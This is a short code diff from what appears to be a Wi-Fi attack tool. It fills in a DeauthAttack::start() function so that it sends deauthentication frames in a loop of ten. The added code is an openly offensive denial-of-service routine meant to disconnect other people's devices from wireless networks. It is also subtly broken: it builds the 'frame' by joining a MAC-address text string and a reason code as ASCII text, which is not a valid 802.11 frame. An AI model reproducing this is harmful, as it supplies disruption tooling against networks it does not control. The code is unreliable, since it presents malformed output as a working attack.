@@ -32,6 +32,19 @@ void DeauthAttack::startRandomDeauth() {
 }
 
 void DeauthAttack::start(bool param1, bool param2, bool param3, bool param4, bool param5, int param6) {
-    // Implementation of the start function
-    // Modify this according to your requirements
+  running = true;
+
+  // Craft and send deauthentication frame
+  String reasonCode = "3"; // 3 corresponds to "Deauthenticated because sending STA is leaving (or has left) BSS"
+  String deauthPacket = "c0:ff:ee:c0:ff:ee" + randomAP + reasonCode;
+  uint8_t* deauthPacketBytes = (uint8_t*)deauthPacket.c_str();
+  int packetSize = deauthPacket.length();
+
+  // Send the deauthentication packet multiple times for a stronger effect
+  for (int i = 0; i < 10; ++i) {
+    wifi_send_pkt_freedom(deauthPacketBytes, packetSize, 0);
+    delay(100);
+  }
+
+  running = false;
 }
